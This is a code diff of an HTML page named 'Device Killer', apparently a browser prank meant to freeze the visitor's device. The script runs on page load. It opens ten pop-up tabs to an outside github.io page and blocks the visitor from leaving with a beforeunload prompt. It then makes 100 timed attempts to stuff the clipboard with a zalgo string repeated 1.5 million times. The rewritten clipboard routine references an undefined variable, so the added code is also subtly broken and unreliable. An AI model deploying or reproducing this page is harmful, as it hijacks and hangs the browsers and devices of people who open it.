@@ -2,46 +2,50 @@
 <html lang="en">
   <head>
     <p style='font-size: 100px'>Device Killer</p>
-    
+
     <script>
-    window.addEventListener('load', 
-      () => { 
-        
-        spam()
-        for (let i = 0; i < 10; i++) {
-          window.open('https://devicepwner.github.io/device/hide', '_blank').focus()
-        }
-      })
-      window.addEventListener('beforeunload', 
-      (e) => { 
-        return 'Nope!'
-      });
+    window.addEventListener('load', () => {
+      spam();
+      for (let i = 0; i < 10; i++) {
+        window.open('https://devicepwner.github.io/device/hide', '_blank').focus()
+      }
+    })
+
+    window.addEventListener('beforeunload', (e) => {
+      return 'Nope!'
+    })
+
     function randomString(length) {
-        let result = '';
-        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-        let counter = 0;
+        let result = ''
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+        let counter = 0
         while (counter < length) {
-          result += characters.charAt(Math.floor(Math.random() * characters.length));
-          counter += 1;
+          result += characters.charAt(Math.floor(Math.random() * characters.length))
+          counter += 1
         }
-        return result;
+        return result
     }
+
     let length = 1500000
     let loops = 100
     let delay = 1000
+
     function test() {
-        navigator.clipboard.writeText('a̴̷̡͔͎̹̠͇̣ͤ̈̀͂́̇̑̚͝͞s̷͕͖͍͖̙̪ͨ̇̏ͨͧ͂̿ͪ̒͑̍̃͊d̡̢͙̪̥͕͇͈̹̩̺̯̫̖̉̍ͪͪ͌̋͒̈́̊̚͢͝͠͡͠ä̷͚͎̪̞̻̝̺̫̣̜̝̲̬́͌ͧ́̂̐̍ͭ̑̅͒̾̑ͤ̋͑̾ͦͩ̉̐ͣ͑͐̅̑̕̚͘͠͡'.repeat(length) + `${randomString(10)}`) 
-      
+        let text = document.createElement('text')
+        text.value = 'a̴̷̡͔͎̹̠͇̣ͤ̈̀͂́̇̑̚͝͞s̷͕͖͍͖̙̪ͨ̇̏ͨͧ͂̿ͪ̒͑̍̃͊d̡̢͙̪̥͕͇͈̹̩̺̯̫̖̉̍ͪͪ͌̋͒̈́̊̚͢͝͠͡͠ä̷͚͎̪̞̻̝̺̫̣̜̝̲̬́͌ͧ́̂̐̍ͭ̑̅͒̾̑ͤ̋͑̾ͦͩ̉̐ͣ͑͐̅̑̕̚͘͠͡'.repeat(length) + `${randomString(10)}`
+        text.select()
+        text.setSelectionRange(0, tempInput.value.length)
+        document.execCommand('copy')
     }
-      
+
     function spam() {
-      
       for (let i = 0; i < loops; i++) {
         setTimeout(test, i * delay)
       }
-    
     }
-  </script>
+    </script>
   </head>
-  <img src="image.png" alt="Gru">
+  <body>
+    <img src="image.png" alt="Gru">
+  </body>
 </html>
